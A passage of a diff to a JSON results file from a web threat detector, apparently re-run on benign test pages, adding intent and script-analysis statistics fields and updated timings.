+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 4.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -13718,24 +16005,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 70.6,
-   "quality": 36.9,
-   "dom_features": 23.8,
-   "dom_model": 24.9,
-   "content": 51.2,
-   "text_models": 355.3,
-   "js_analysis": 2.8,
+   "preprocess": 67.1,
+   "quality": 41.7,
+   "dom_features": 29.8,
+   "dom_model": 22.0,
+   "content": 42.3,
+   "text_models": 365.1,
+   "js_analysis": 3.0,
    "behavior": 0.9,
-   "behavior_model": 23.4,
+   "behavior_model": 32.6,
    "fusion": 0.1,
-   "total": 591.0
+   "total": 630.8
   }
  },
  "13": {
-  "analysis_id": "0b887565aea34d2db8048d3f8b13c784",
+  "analysis_id": "281f0bbfd2f74452ab12f725a1a60d12",
   "request_id": "c2_benign_000062",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:41.330144+05:30",
+  "analyzed_at": "2026-10-21T08:25:49.058705+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -13830,7 +16117,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -13868,7 +16158,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 9.0,
+     "page_text_chars": 208.0,
+     "language_confidence": 0.8299,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -13891,7 +16191,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 7.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -13971,24 +16283,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 5.1,
+   "preprocess": 5.2,
    "quality": 3.4,
-   "dom_features": 2.3,
-   "dom_model": 51.9,
-   "content": 3.9,
-   "text_models": 60.2,
-   "js_analysis": 5.1,
-   "behavior": 3.6,
-   "behavior_model": 29.5,
+   "dom_features": 2.2,
+   "dom_model": 54.2,
+   "content": 2.0,
+   "text_models": 63.5,
+   "js_analysis": 6.1,
+   "behavior": 4.3,
+   "behavior_model": 33.4,
    "fusion": 0.1,
-   "total": 165.8
+   "total": 177.1
   }
  },
  "12": {
-  "analysis_id": "8cc36a23248947daba36048e199dc40c",
+  "analysis_id": "f6feae06a287444ea1df0edd91092083",
   "request_id": "c2_benign_000058",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:41.142759+05:30",
+  "analyzed_at": "2026-10-21T08:25:48.860857+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -14049,7 +16361,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -14087,7 +16402,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 250.0,
+     "page_text_chars": 2992.0,
+     "language_confidence": 0.5184,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -14110,7 +16435,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 15.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 13.0,
+     "sinks_total": 7.0,
+     "flows_total": 1.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -14190,24 +16527,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 126.7,
-   "quality": 49.3,
-   "dom_features": 49.1,
-   "dom_model": 20.7,
-   "content": 84.6,
-   "text_models": 365.4,
-   "js_analysis": 20.2,
-   "behavior": 21.3,
-   "behavior_model": 32.1,
+   "preprocess": 132.1,
+   "quality": 49.7,
+   "dom_features": 46.6,
+   "dom_model": 21.6,
+   "content": 76.5,
+   "text_models": 367.6,
+   "js_analysis": 19.2,
+   "behavior": 25.1,
+   "behavior_model": 31.1,
    "fusion": 0.1,
-   "total": 772.1
+   "total": 793.9
   }
  },
  "11": {
-  "analysis_id": "2042aa1cecae4432be800ff945486b3c",
+  "analysis_id": "cf22a1c7beeb4ad68e7b4e99d04f755f",
   "request_id": "c2_benign_000057",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:40.346535+05:30",
+  "analyzed_at": "2026-10-21T08:25:48.043298+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -14291,7 +16628,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -14329,7 +16669,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 181.0,
+     "page_text_chars": 2988.0,
+     "language_confidence": 0.6697,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0013,
+     "latin_script_ratio": 0.9944
+    }
    },
    "behavior": {
     "status": "ok",
@@ -14352,7 +16702,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 5.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 1.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -14432,24 +16794,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 56.0,
-   "quality": 37.8,
+   "preprocess": 55.7,
+   "quality": 37.9,
    "dom_features": 33.4,
-   "dom_model": 21.1,
-   "content": 69.1,
-   "text_models": 317.3,
-   "js_analysis": 6.0,
-   "behavior": 7.6,
-   "behavior_model": 27.9,
+   "dom_model": 25.1,
+   "content": 64.3,
+   "text_models": 367.4,
+   "js_analysis": 6.6,
+   "behavior": 8.4,
+   "behavior_model": 28.9,
    "fusion": 0.1,
-   "total": 578.0
+   "total": 645.7
   }
  },
  "10": {
-  "analysis_id": "c03b8ce48b624a66a6d5934e746ada1a",
+  "analysis_id": "5fd142d4b40d4d1ca225a533ff419318",
   "request_id": "c2_benign_000048",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:39.754674+05:30",
+  "analyzed_at": "2026-10-21T08:25:47.383982+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -14522,7 +16884,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -14560,7 +16925,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 225.0,
+     "page_text_chars": 2990.0,
+     "language_confidence": 0.7403,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9889
+    }
    },
    "behavior": {
     "status": "ok",
@@ -14583,7 +16958,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 33.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 6.0,
+     "sinks_total": 5.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -14663,24 +17050,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 233.4,
-   "quality": 26.8,
-   "dom_features": 20.6,
-   "dom_model": 22.0,
-   "content": 64.9,
-   "text_models": 327.4,
-   "js_analysis": 70.0,
-   "behavior": 127.9,
-   "behavior_model": 22.7,
+   "preprocess": 224.1,
+   "quality": 31.6,
+   "dom_features": 25.1,
+   "dom_model": 22.1,
+   "content": 61.8,
+   "text_models": 352.1,
+   "js_analysis": 71.8,
+   "behavior": 111.0,
+   "behavior_model": 23.4,
    "fusion": 0.1,
-   "total": 918.0
+   "total": 941.3
   }
  },
  "9": {
-  "analysis_id": "c4de74a0ef96418b8a54e77270cdfd78",
+  "analysis_id": "217c4de0ffa94eb28050d7e96804f601",
   "request_id": "c2_benign_000040",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:38.814160+05:30",
+  "analyzed_at": "2026-10-21T08:25:46.424202+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -14763,7 +17150,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -14803,7 +17193,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 10.0,
+     "page_text_chars": 1115.0,
+     "language_confidence": 0.9391,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -14826,7 +17226,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -14906,24 +17318,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 6.5,
-   "quality": 3.7,
-   "dom_features": 3.4,
-   "dom_model": 33.8,
-   "content": 3.0,
-   "text_models": 168.7,
+   "preprocess": 3.4,
+   "quality": 2.2,
+   "dom_features": 1.7,
+   "dom_model": 29.1,
+   "content": 4.0,
+   "text_models": 183.5,
    "js_analysis": 0.1,
    "behavior": 0.2,
-   "behavior_model": 31.8,
+   "behavior_model": 32.2,
    "fusion": 0.1,
-   "total": 251.9
+   "total": 261.0
   }
  },
  "8": {
-  "analysis_id": "a059cf3323bc4b97b67ddb0fbeb641a7",
+  "analysis_id": "e2a4e494514148adadfedf50540f6c64",
   "request_id": "c2_benign_000029",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:38.539244+05:30",
+  "analyzed_at": "2026-10-21T08:25:46.145385+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -14996,7 +17408,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -15034,7 +17449,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 281.0,
+     "page_text_chars": 2995.0,
+     "language_confidence": 0.8886,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -15057,7 +17482,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -15137,24 +17574,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 66.6,
-   "quality": 30.5,
-   "dom_features": 21.4,
-   "dom_model": 20.4,
-   "content": 63.6,
-   "text_models": 303.5,
-   "js_analysis": 3.2,
+   "preprocess": 70.3,
+   "quality": 29.7,
+   "dom_features": 21.8,
+   "dom_model": 23.0,
+   "content": 61.2,
+   "text_models": 349.3,
+   "js_analysis": 3.6,
    "behavior": 0.3,
-   "behavior_model": 26.7,
+   "behavior_model": 32.1,
    "fusion": 0.1,
-   "total": 538.7
+   "total": 631.5
   }
  },
  "7": {
-  "analysis_id": "4823a43b4e4b441ab32da15cdb8d8b24",
+  "analysis_id": "471c420708d0417eab6573d826d10ab9",
   "request_id": "c2_benign_000025",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:37.977580+05:30",
+  "analyzed_at": "2026-10-21T08:25:45.490720+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -15237,7 +17674,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -15277,7 +17717,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 353.0,
+     "page_text_chars": 2996.0,
+     "language_confidence": 0.9097,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.1312
+    }
    },
    "behavior": {
     "status": "ok",
@@ -15300,7 +17750,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 269.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 3.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -15380,24 +17842,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 142.3,
-   "quality": 57.3,
-   "dom_features": 42.8,
-   "dom_model": 21.5,
-   "content": 94.8,
-   "text_models": 308.4,
-   "js_analysis": 34.7,
-   "behavior": 32.6,
-   "behavior_model": 31.6,
+   "preprocess": 153.3,
+   "quality": 57.6,
+   "dom_features": 44.5,
+   "dom_model": 23.4,
+   "content": 114.9,
+   "text_models": 358.1,
+   "js_analysis": 29.6,
+   "behavior": 29.0,
+   "behavior_model": 32.3,
    "fusion": 0.1,
-   "total": 768.3
+   "total": 861.0
   }
  },
  "6": {
-  "analysis_id": "11eddde720144431bb90bc4c7eb86527",
+  "analysis_id": "780aa91618624fd9a7d511d2b6b65865",
   "request_id": "c2_benign_000024",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:37.192644+05:30",
+  "analyzed_at": "2026-10-21T08:25:44.609203+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -15468,7 +17930,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -15508,7 +17973,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 82.0,
+     "page_text_chars": 2989.0,
+     "language_confidence": 0.8058,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -15531,7 +18006,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -15611,24 +18098,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 23.9,
-   "quality": 10.1,
-   "dom_features": 8.0,
-   "dom_model": 31.2,
-   "content": 20.3,
-   "text_models": 362.1,
-   "js_analysis": 0.3,
-   "behavior": 0.3,
-   "behavior_model": 37.3,
+   "preprocess": 17.8,
+   "quality": 9.2,
+   "dom_features": 7.4,
+   "dom_model": 30.8,
+   "content": 22.7,
+   "text_models": 373.2,
+   "js_analysis": 0.2,
+   "behavior": 0.2,
+   "behavior_model": 27.4,
    "fusion": 0.1,
-   "total": 494.9
+   "total": 507.4
   }
  },
  "5": {
-  "analysis_id": "5634f3f805e24863bbfcf308403588f5",
+  "analysis_id": "ffaee7cf0b9d434bb30c6f529f5208cc",
   "request_id": "c2_benign_000011",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:36.677073+05:30",
+  "analyzed_at": "2026-10-21T08:25:44.087095+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -15712,7 +18199,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -15750,7 +18240,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 43.0,
+     "page_text_chars": 2984.0,
+     "language_confidence": 0.9156,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.9885
+    }
    },
    "behavior": {
     "status": "ok",
@@ -15773,7 +18273,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 0.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 1.0,
+     "sources_total": 0.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -15855,22 +18367,22 @@
   "timings_ms": {
    "preprocess": 10.1,
    "quality": 6.0,
-   "dom_features": 8.5,
-   "dom_model": 26.1,
-   "content": 14.2,
-   "text_models": 358.0,
-   "js_analysis": 0.9,
-   "behavior": 0.2,
-   "behavior_model": 27.4,
+   "dom_features": 8.9,
+   "dom_model": 26.6,
+   "content": 12.6,
+   "text_models": 378.5,
+   "js_analysis": 1.7,
+   "behavior": 0.4,
+   "behavior_model": 32.0,
    "fusion": 0.1,
-   "total": 452.2
+   "total": 492.4
   }
  },
  "4": {
-  "analysis_id": "a5ff94af850c4fdab976f440c173fd5a",
+  "analysis_id": "ac27cf79b4fa41ea98a3b38dca24fee3",
   "request_id": "c2_benign_000008",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:36.212769+05:30",
+  "analyzed_at": "2026-10-21T08:25:43.582093+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -15931,7 +18443,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -15969,7 +18484,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 139.0,
+     "page_text_chars": 2996.0,
+     "language_confidence": 0.8181,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -15992,7 +18517,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 19.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 1.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -16072,24 +18609,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 63.9,
-   "quality": 23.2,
-   "dom_features": 17.5,
-   "dom_model": 20.9,
-   "content": 46.3,
-   "text_models": 325.4,
-   "js_analysis": 99.8,
-   "behavior": 104.3,
-   "behavior_model": 22.4,
+   "preprocess": 52.4,
+   "quality": 26.3,
+   "dom_features": 18.0,
+   "dom_model": 21.1,
+   "content": 38.4,
+   "text_models": 364.8,
+   "js_analysis": 103.5,
+   "behavior": 105.5,
+   "behavior_model": 23.8,
    "fusion": 0.1,
-   "total": 725.6
+   "total": 781.9
   }
  },
  "3": {
-  "analysis_id": "56410047b2574189a370d1efe1ac2a87",
+  "analysis_id": "a5188899dfc54e01b682cbbae8d01667",
   "request_id": "c2_benign_000003",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:35.465425+05:30",
+  "analyzed_at": "2026-10-21T08:25:42.779722+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -16173,7 +18710,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -16211,7 +18751,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 112.0,
+     "page_text_chars": 1656.0,
+     "language_confidence": 0.9516,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 0.0764
+    }
    },
    "behavior": {
     "status": "ok",
@@ -16234,7 +18784,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 6.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 3.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -16314,24 +18876,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 16.6,
-   "quality": 9.6,
-   "dom_features": 7.2,
-   "dom_model": 20.2,
-   "content": 15.1,
-   "text_models": 337.6,
-   "js_analysis": 29.7,
-   "behavior": 57.1,
-   "behavior_model": 27.6,
+   "preprocess": 21.2,
+   "quality": 10.8,
+   "dom_features": 7.3,
+   "dom_model": 24.2,
+   "content": 23.5,
+   "text_models": 377.5,
+   "js_analysis": 35.1,
+   "behavior": 60.4,
+   "behavior_model": 32.5,
    "fusion": 0.1,
-   "total": 521.6
+   "total": 603.2
   }
  },
  "2": {
-  "analysis_id": "d0fb2bdaaaee405db138b70920b83dcc",
+  "analysis_id": "a29bc9f79f60433cafa6f08bf89ff0af",
   "request_id": "c2_benign_000002",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:34.931469+05:30",
+  "analyzed_at": "2026-10-21T08:25:42.164060+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -16426,7 +18988,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -16464,7 +19029,17 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 4.0,
+     "page_text_chars": 149.0,
+     "language_confidence": 0.9414,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -16487,7 +19062,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 32.0,
+     "scripts_lexical": 1.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 1.0,
+     "sinks_total": 0.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -16567,24 +19154,24 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 34.3,
-   "quality": 37.3,
-   "dom_features": 10.8,
-   "dom_model": 25.4,
-   "content": 11.0,
-   "text_models": 47.6,
-   "js_analysis": 492.9,
-   "behavior": 44.4,
-   "behavior_model": 22.2,
+   "preprocess": 26.6,
+   "quality": 29.2,
+   "dom_features": 14.6,
+   "dom_model": 22.3,
+   "content": 10.9,
+   "text_models": 44.8,
+   "js_analysis": 490.7,
+   "behavior": 46.1,
+   "behavior_model": 24.6,
    "fusion": 0.1,
-   "total": 727.9
+   "total": 713.7
   }
  },
  "1": {
-  "analysis_id": "79a3d4ae67ef4df0a1b371e1f75ffd03",
+  "analysis_id": "1131b4ed59db4ebfaa89f584c1b1b6d6",
   "request_id": "c2_benign_000001",
   "schema_version": "c2.analysis.v1",
-  "analyzed_at": "2026-10-18T00:01:34.180786+05:30",
+  "analyzed_at": "2026-10-21T08:25:41.425201+05:30",
   "source": "threatradar",
   "cached": false,
   "input": {
@@ -16679,7 +19266,10 @@
       },
       "fusion_weight": 0.1
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": null,
+    "stats": {}
    },
    "content": {
     "status": "ok",
@@ -16717,7 +19307,29 @@
       },
       "fusion_weight": 0.4
      }
-    ]
+    ],
+    "intents": [
+     {
+      "intent": "investment_lure",
+      "display": "investment lure",
+      "method": "cue_words",
+      "severity": null,
+      "count": 1,
+      "cues": [
+       "roi"
+      ],
+      "example": "What is Azure? Get started with Azure Global infrastructure Datacenter regions Trust your cloud Azure Essentials Customer stories Products Azure pricing Free A…"
+     }
+    ],
+    "intent_method": "cue-word matches of the intent taxonomy (preliminary; intent model pending, Part 6B)",
+    "stats": {
+     "segments": 180.0,
+     "page_text_chars": 2998.0,
+     "language_confidence": 0.8051,
+     "si_script_ratio": 0.0,
+     "ta_script_ratio": 0.0,
+     "latin_script_ratio": 1.0
+    }
    },
    "behavior": {
     "status": "ok",
@@ -16740,7 +19352,19 @@
       },
       "fusion_weight": 0.3
      }
-    ]
+    ],
+    "intents": [],
+    "intent_method": "static AST source->sink patterns (Part 8, never executed)",
+    "stats": {
+     "scripts_analyzed": 12.0,
+     "scripts_lexical": 0.0,
+     "library_scripts_skipped": 0.0,
+     "sources_total": 2.0,
+     "sinks_total": 1.0,
+     "flows_total": 0.0,
+     "flows_external": 0.0,
+     "behavior_risk_score": 0.0
+    }
    }
   },
   "explanation": {
@@ -16820,17 +19444,17 @@
    "verdict_thresholds": "2026-10-17T21:04:36+05:30"
   },
   "timings_ms": {
-   "preprocess": 129.7,
-   "quality": 70.1,
-   "dom_features": 213.9,
-   "dom_model": 207.2,
-   "content": 127.7,
-   "text_models": 1576.7,
-   "js_analysis": 11.1,
-   "behavior": 8.7,
-   "behavior_model": 23.3,
+   "preprocess": 136.8,
+   "quality": 65.1,
+   "dom_features": 206.8,
+   "dom_model": 645.8,
+   "content": 134.7,
+   "text_models": 487.4,
+   "js_analysis": 11.6,
+   "behavior": 10.5,
+   "behavior_model": 34.4,
    "fusion": 0.1,
-   "total": 2371.4
+   "total": 1768.2
   }
  }
 }
